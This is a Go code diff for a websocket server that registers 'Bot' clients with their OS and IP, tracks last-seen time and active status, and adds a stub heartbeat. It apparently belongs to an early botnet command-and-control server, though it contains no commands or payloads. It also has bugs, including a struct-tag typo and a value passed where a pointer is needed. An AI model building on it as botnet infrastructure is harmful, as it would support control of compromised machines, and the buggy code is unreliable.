@@ -16,6 +16,7 @@ type Bot struct {
 	OS       string `jsin:"os"`
 	IP       string `json:"ip"`
 	LastSeen string
+	Active   bool
 	// Command Command
 }
 
@@ -29,29 +30,36 @@ type Bot struct {
 // }
 
 func connectBot(w http.ResponseWriter, r *http.Request) {
-	b := Bot{}
+	b := Bot{
+		Active: false,
+	}
 	var con *websocket.Conn
 	var err error
 	if con, err = websocket.Accept(w, r, nil); err != nil {
 		log.Println(err)
 		return
 	}
+
+	defer con.Close(websocket.StatusNormalClosure, "")
 	ctx := context.Background()
 	// read
+	go heartBeat(con, &b)
 	for {
 		if err := wsjson.Read(ctx, con, b); err != nil {
 			log.Println(err)
 			return
 		}
 		b.LastSeen = time.Now().Format("03:04:05PM")
+		b.Active = true
 		fmt.Print(b)
 	}
 
-	con.Close(websocket.StatusNormalClosure, "")
 }
 
-func heartBeat(con *websocket.Conn) {
-	//will do later
+func heartBeat(con *websocket.Conn, bot *Bot) {
+	if bot.Active {
+		time.Sleep(1 * time.Minute)
+	}
 }
 func main() {
 
